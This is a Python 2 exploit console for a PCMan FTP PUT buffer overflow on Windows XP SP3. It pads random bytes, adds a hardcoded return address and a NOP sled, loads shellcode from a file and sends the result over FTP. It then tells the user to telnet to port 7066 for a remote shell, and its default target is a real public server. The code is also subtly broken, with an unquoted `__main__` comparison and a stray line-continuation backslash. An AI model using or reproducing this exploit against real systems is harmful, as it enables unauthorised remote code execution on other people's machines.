import ftplib
import cmd
from random import randint
from socket import AF_INET, SOCK_STREAM, socket, gethostbyname

def getToken(line):
    token = ""
    for letter in line:
        if letter != " ":
            token += letter
        else:
            break
    return token

class pcmanPutOverflowMenu(cmd.Cmd):
  def __init__(self):
    cmd.Cmd.__init__(self)
    self.user = ["anonymous"]
    self.passwd = ["anonymous@example.com"]
    self.host = ["ftp.debian.org"]
  def help_help(self):
    print "Usage: help [cmd]"
    print "cmd    the command to get help on"
    print "help: show help on a command or list commands"
  def help_set(self):
    print "Usage: set [var] = [val]"
    print "var    variable to set"
    print "val    value to set variable to"
    print "set: set a variable to a value"
    print "Note: you MUST use it exactly as shown: no set [var]=[val]!"
  def do_set(self, args):
    var = getToken(args)
    val = args[len(var) + 3:]
    if var == "user":
      self.user[0] = val
    elif var == "passwd":
      self.passwd[0] = val
    elif var == "host":
      self.host[0] = val
    else:
      print "*** Variable not found %s" % var
      return
    print "[*]%s => %s" % (var, val)
  def help_show(self):
    print "Usage: show options"
    print "show options: show the variables, current values, and descriptions"
  def do_show(self, args):
    if args != "options":
      print "*** Unknown argument: " + args
    print "Target: Windows XP SP3 English"
    print "Options for pcman_put_overflow:"
    print "========================"
    print "user    %s    the user to login in as" % self.user[0]
    print "passwd    %s    the password of the user" % self.passwd[0]
    print "host    %s    the IP of the target" % self.host[0]
  def help_exit(self):
    print "Usage: exit"
    print "exit: exit the pcman_put_overflow context"
  def do_exit(self, args):
    if args:
      print "*** Argument number: needed 0"
      return
    return True
  def help_start(self):
    print "Usage: start"
    print "start: start the attack"
  def do_start(self, args):
    for let in "abcdefghijklmnopqrstuvwxyz":
      if let in self.host[0]:
        self.host[0] = gethostbyname(self.host[0])
    ftp = ftplib.FTP(self.host[0])
    try:
     ftp.login(self.user[0], self.passwd[0])
     print "[+]Login successful on %s" % self.host[0]
    except:
      print "[-]Login unsuccessful on %s" % self.host[0]
      return
    ftp.quit()
    print "[*]Generating payload..."
    char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
    payload = ""
    for a in range(0, 2017):
      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
      payload += tmp.decode('string_escape')
    payload += "\x77\xc3\x54\x59"
    payload += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    f = open("../../../payloads/pcman_put.shell", "r")
    for line in f.readlines():
      payload += line[:-1].decode('string_escape')
    f.close()
    print "[+]Payload generated."
    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
    s = socket(AF_INET, SOCK_STREAM)
    s.connect((self.host[0], 21))
    s.recv(1024)
    s.send("USER " + self.user[0])
    s.recv(1024)
    s.send("PASS " + self.passwd[0])
    s.recv(1024)
    s.send("PUT " + payload)\
    s.close()
    print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
def main():
  pcmanputoverflowmenu = pcmanPutOverflowMenu()
  pcmanputoverflowmenu.cmdloop("pdf-console attack(pcman_put_overflow)% ")
if __name__ == __main__:
  main()
